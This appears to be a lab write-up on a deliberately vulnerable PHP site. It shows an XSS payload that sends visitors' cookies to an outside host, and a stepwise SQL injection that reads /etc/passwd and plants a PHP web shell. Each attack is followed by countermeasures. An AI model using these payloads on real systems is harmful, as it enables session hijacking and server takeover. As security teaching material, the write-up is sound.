# 1 - Cross-Site Scripting

## 1.1 - XSS vulnerability: cookie hijack attack

When creating a new post, one can easily see that angle brackets aren't
escaped, hence allowing a XSS attack.

With the following payload, any user loading the post page will send
a GET request to 10.0.2.2 with its cookie as a query parameter.
As a sidenote, I ran my own little Web server on my host outsite
VirtualBox, which explains this raw IP.

```html
<script>
var request = new XMLHttpRequest();
request.open("GET", "http://10.0.2.2:3001?cookie=" + document.cookie);
request.send(null);
</script>
```

The server receives a request with a body similar to the following one:

```json
{ cookie: 'PHPSESSID=4l9v89l9s2vkog36aoef350pd4' }
```

Then, you just have to wait for an admin to leak its cookie, and with
his cookie you can pretty much spoof its identity. To do so, you just
have to add a cookie on your client browset and set its value to the
admin stolen cookie.

## 1.2 - Countermeasures

The easiest way to prevent this XSS vulnerability is to sanitize all
fields from the server to the client using, for example,
`htmlspecialchars` in PHP.

The user input should also be validated to avoid inserting illegal
characters into the database, like weird unicode characters that can
mess with the disposition of the page (Zalgo, RTLO, etc). For "real" XSS
attacks, some websites like GitHub restrict the use of certain tags like
`<script>` or `<style>` while allowing some other (`<a>`, `<br/>`...).
Make sure however that, for images, their source is also checked.

Otherwise, a heavier solution could be to use a front-end framework
like Angular or React and use API requests to fetch the data. These
framework will then sanitize the data by themselves by default and
prevent unsafe DOM operations.

HTTP headers can also be used to limit the leak if a XSS is exploited.
Content Security Policy can prevent the client from fetching external
websites and allowing only its own domain.

Finally, even with a XSS vulnerability, cookie theft can be avoided by
marking the cookie as HTTP only, which makes it unreadable by a JS
script.

# 2 - SQL Injection

## 2.1 - Vulnerability

An SQL injection happens when the client is allowed to communicate with
the database with unsanitized input, effectively gaining access to it.
In a safe web server, the client communicates to the server through an
API or using forms, and then the server communicates to the database.

However, on the `/admin/edit.php` page, it can be seen that it is
possible to directly access the SQL database through the `id` query
parameter.

After trying the other pages, it feels like this is the only SQL
vulnerability. However, with these kind of vulnerabilities, the devil is
in the details and it is a tedious job to check all inputs.

To find this vulnerability, I noticed that the route
`/admin/edit.php?id=-1` would, obvously, not find anything, however the
route `/admin/edit.php?id=-1 or true` would find a result.
Then, after some trial and error, I found that the route
`/admin/edit.php?id=0 union select 1,2,3,4` fills the textarea with the
text `3`. We just have to replace this `3` in the request by something
more useful and voila, with the route
`/admin/edit.php?id=0 union select 1,2,load_file("/etc/passwd"),4` we
get the content of the `/etc/passwd` file.

Looking at the source of the page, we can see that a `css` directory
exists. Usually, web servers are served from the Unix directory
`/var/www`. We can then try to create a file inside using our previous
SQL injection, on the route:
`/admin/edit.php?id=0 union select 1,2,3,4 into outfile "/var/www/css/test.php"`
Then, getting the page `/css/test.php` shows `1 2 3 4`, which proves
that we managed to write code into a server file.

Finally, we just have to use the route
`/admin/edit.php?id=0 union select 1,2,"<?php system($_GET['cmd']); ?>",4 into outfile "/var/www/css/attack.php"`
to create a remote shell on the `/css/attack.php` page. The command is
sent using the `cmd` query parameter. For example, we can now get the
content of the `/etc/passwd` file by fetching
`/css/attack.php?cmd=cat /etc/passwd`. This even works without the admin
cookie; we effectively installed a backdoor in the system, and can now
do whatever we want, like installing packages, load additional scripts
from internet, open a SSH connection, etc.

## 2.2 - Countermeasures

On the application side, every user input should be sanitized. The
server should also use prepared statements to force MySQL to interpret
the data as data and not as a command.
```php
$stmt = $conn->prepare("INSERT INTO db (username, password) VALUES (?, ?)");
$stmt->bind_param("ss", $user, $passwd);
```
As always, one can also use an ORM framework to make sure no SQL query
get forgotten.
SQL transactions can also be used, such that the transaction can be
cancelled if the server notice something is off, like more than one row
deleted from the table.

Additionally, the database itself should have as few permissions as
possible. It shouldn't be possible to access or modify external
resources like the file system, internal resources like the SQL users
or the structure of the table (forbid drop, add or remove column, change
charset, etc).

The third and last point is at the OS level. The Web server should
definitely not run as root, it should at least run as a separate user
with very limited read / write filesystem access, and at best run in its
own Docker container. This would also limit the resource allocation by
preventing exessive RAM or CPU usage that could slow the whole physical
server.
